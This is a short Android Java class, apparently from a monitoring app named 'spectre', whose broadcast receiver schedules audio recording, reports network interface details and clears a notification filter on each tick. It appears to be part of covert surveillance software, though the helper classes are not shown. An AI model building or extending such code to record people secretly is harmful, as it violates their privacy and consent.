package com.hygnus.spectre;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class Ticker extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (AudioRecorder.ENABLE_AUDIO_RECORDER) { AudioRecorder.schedule(); }
        NetworkDriver.reportNetworkInterface();
        NotificationDriver.clearFilter();
    }
}